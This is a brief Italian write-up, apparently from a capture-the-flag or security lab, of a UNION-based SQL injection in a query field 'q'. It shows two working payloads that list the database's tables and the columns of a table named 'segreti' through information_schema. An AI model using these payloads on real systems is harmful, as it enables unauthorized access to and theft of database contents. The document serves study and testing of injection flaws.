L'applicazione rifletteva i risultati di una query SQL nel campo q. Ho utilizzato l'operatore UNION per forzare il database a restituire i nomi delle tabelle presenti.

Payload: -1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#

Payload: -1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='segreti'#

Risultato: Individuate le colonne id, titolo e valore.
